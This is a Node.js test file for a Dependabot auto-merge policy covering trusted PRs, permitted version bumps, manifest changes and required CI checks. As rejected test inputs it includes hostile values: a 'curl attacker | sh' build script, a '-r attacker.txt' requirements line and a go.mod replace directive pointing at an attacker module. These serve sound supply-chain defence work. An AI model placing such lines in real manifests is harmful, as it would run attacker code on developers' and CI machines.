'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { REQUIRED_CHECKS, trustedPullRequest, trustedChanges, compatibleVersion, compatibleManifest, checksPassed } = require('./dependabot-policy.cjs');

const repository = 'FallicoFunctions/OmniNudge';
const bot = { login: 'dependabot[bot]', id: 49699333, type: 'Bot' };
const pr = { state: 'open', draft: false, user: bot, changed_files: 1, commits: 1,
  head: { sha: 'abc', ref: 'dependabot/npm_and_yarn/frontend/update', repo: { full_name: repository } },
  base: { ref: 'main', repo: { full_name: repository } } };
const commit = { sha: 'abc', author: bot, commit: { verification: { verified: true } } };
const files = [{ filename: 'frontend/package-lock.json', status: 'modified' }];
const check = name => ({ name, status: 'COMPLETED', conclusion: 'SUCCESS' });

test('only authenticated same-repository Dependabot PRs are eligible', () => {
  assert.equal(trustedPullRequest(pr, repository), true);
  for (const change of [{ user: { ...bot, id: 1 } }, { user: { ...bot, type: 'User' } },
    { draft: true }, { state: 'closed' }, { head: { ...pr.head, repo: { full_name: 'attacker/fork' } } },
    { base: { ...pr.base, ref: 'develop' } }]) {
    assert.equal(trustedPullRequest({ ...pr, ...change }, repository), false);
  }
});

test('deny source/workflow edits, renames, missing pages and unsigned or human commits', () => {
  assert.equal(trustedChanges(pr, files, [commit]), true);
  for (const file of [{ filename: 'frontend/src/main.tsx', status: 'modified' },
    { filename: '.github/workflows/ci.yml', status: 'modified' }, { ...files[0], status: 'renamed' }]) {
    assert.equal(trustedChanges(pr, [file], [commit]), false);
  }
  assert.equal(trustedChanges({ ...pr, changed_files: 2 }, files, [commit]), false);
  assert.equal(trustedChanges({ ...pr, commits: 2 }, files, [commit]), false);
  assert.equal(trustedChanges(pr, files, [{ ...commit, author: { login: 'human' } }]), false);
  assert.equal(trustedChanges(pr, files, [{ ...commit, sha: 'stale' }]), false);
  assert.equal(trustedChanges(pr, files, [{ ...commit, commit: { verification: { verified: false } } }]), false);
});

test('allow patches/minors and Go pseudo versions; deny majors, downgrades and ambiguous ranges', () => {
  for (const [before, after] of [['^3.4.15', '^3.4.16'], ['1.14.4', '1.14.5'], ['v1.83.2', 'v1.84.0'],
    ['4.10.0.84', '4.13.0.94'], ['v0.0.0-20260819154853-08b0e4226688', 'v0.0.0-20260921155816-b14227669459']]) {
    assert.equal(compatibleVersion(before, after), true);
  }
  for (const [before, after] of [['^3.4.18', '^4.3.3'], ['1.14.5', '1.14.4'], ['1.1.0', '1.0.9'],
    ['^1.0.0', '*'], ['1.0.0', '1.0.1-beta'], ['^1.0.0', '~1.0.1']]) {
    assert.equal(compatibleVersion(before, after), false);
  }
});

test('npm policy permits fixes but rejects script/config changes and majors', () => {
  const before = { scripts: { build: 'vite build' }, dependencies: { dompurify: '^3.4.15' } };
  const after = { ...before, dependencies: { dompurify: '^3.4.16' } };
  const eligible = value => compatibleManifest('frontend/package.json', JSON.stringify(before), JSON.stringify(value));
  assert.equal(eligible(after), true);
  assert.equal(eligible({ ...after, scripts: { build: 'curl attacker | sh' } }), false);
  assert.equal(eligible({ ...after, dependencies: { dompurify: '^4.0.0' } }), false);
  assert.equal(eligible({ ...after, dependencies: {} }), false);
});

test('lock-only direct major update cannot bypass the manifest policy', () => {
  const lock = version => ({ lockfileVersion: 3, packages: {
    '': { dependencies: { example: '*' } }, 'node_modules/example': { version },
  } });
  const eligible = version => compatibleManifest('frontend/package-lock.json', JSON.stringify(lock('1.1.0')), JSON.stringify(lock(version)));
  assert.equal(eligible('1.1.1'), true);
  assert.equal(eligible('2.0.0'), false);
  assert.equal(eligible('1.0.0'), false);
});

test('pip pins and Go modules cannot introduce majors or unrelated directives', () => {
  assert.equal(compatibleManifest('infra/runpod/image-worker/requirements.txt', '# keep\nboto3==1.43.94\n', 'boto3==1.43.100\n'), true);
  assert.equal(compatibleManifest('infra/runpod/image-worker/requirements.txt', 'opencv-python-headless==4.10.0.84\n', 'opencv-python-headless==5.0.0.93\n'), false);
  assert.throws(() => compatibleManifest('infra/runpod/image-worker/requirements.txt', 'boto3==1.43.94\n', '-r attacker.txt\n'));
  const before = 'module app\n\ngo 1.26\n\nrequire (\n google.golang.org/grpc v1.83.2 // indirect\n)\n';
  const after = before.replace('v1.83.2', 'v1.84.0');
  assert.equal(compatibleManifest('backend/go.mod', before, after), true);
  assert.equal(compatibleManifest('backend/go.mod', before, after + 'replace example => attacker\n'), false);
});

test('every required job must succeed; extra failures/pending checks also block merging', () => {
  const checks = REQUIRED_CHECKS.map(check);
  assert.equal(checksPassed(checks), true);
  assert.equal(checksPassed(checks.slice(1)), false);
  for (const conclusion of ['FAILURE', 'CANCELLED', 'TIMED_OUT', 'SKIPPED', 'NEUTRAL']) {
    assert.equal(checksPassed([{ ...checks[0], conclusion }, ...checks.slice(1)]), false);
  }
  assert.equal(checksPassed([{ ...checks[0], status: 'IN_PROGRESS' }, ...checks.slice(1)]), false);
  assert.equal(checksPassed([...checks, { ...check('Locale Guardrails'), conclusion: 'FAILURE' }]), false);
});
